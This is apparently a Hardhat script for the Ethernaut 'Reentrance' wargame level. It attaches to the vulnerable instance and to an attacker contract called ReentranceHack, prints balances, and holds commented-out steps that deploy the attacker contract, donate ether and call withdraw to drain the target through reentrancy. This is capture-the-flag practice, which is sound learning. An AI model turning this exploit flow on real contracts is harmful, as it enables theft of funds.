// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    const INSTANCE_ADDRESS = '0x06F9A584214e4b9EF1354FF7930cB9876Be4A14B';
    const INITIAL_BALANCE = 0.001;
    const [owner, addr1] = await ethers.getSigners();

    const reentrance = await hre.ethers.getContractAt("IReentrance", INSTANCE_ADDRESS);

    console.log(await ethers.provider.getBalance(reentrance.address));
    console.log(await reentrance.balanceOf(reentrance.address));
    
    const ReentranceHack = await hre.ethers.getContractFactory("ReentranceHack");
    const reentranceHack = ReentranceHack.attach('0x7e1ABCeC985d471559BAcEd412FBf9E32b115969');
    console.log(await ethers.provider.getBalance(reentranceHack.address))
    // const reentranceHack = await ReentranceHack.deploy(INSTANCE_ADDRESS);
    // await reentranceHack.deployed();

    // console.log(`Reentrance hack deployed on ${reentranceHack.address}`);

    // let tx = await reentrance.donate(reentranceHack.address, {value: hre.ethers.utils.parseEther("0.0005")})
    // console.log(tx);
    // await tx.wait();

    // await reentrance.balanceOf(reentranceHack.address)

    // tx = await reentranceHack.withdraw();
    // console.log(tx);
    // await tx.wait();

    // console.log(await ethers.provider.getBalance(reentrance.address));


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
